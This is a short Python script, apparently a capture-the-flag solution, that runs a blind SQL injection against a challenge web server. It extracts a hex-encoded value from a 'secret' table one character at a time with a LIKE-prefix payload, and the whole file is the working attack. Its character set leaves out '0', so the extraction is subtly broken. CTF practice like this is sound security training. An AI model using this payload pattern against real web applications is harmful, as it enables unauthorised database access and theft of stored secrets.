from injector import *
dictionary = '123456789abcdef'
result = ''
inj = Injector('http://web-17.challs.olicyber.it')
while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response = inj.blind(question)
        if response == 'Success':
            result += c
            break
    else:
        break
print(result)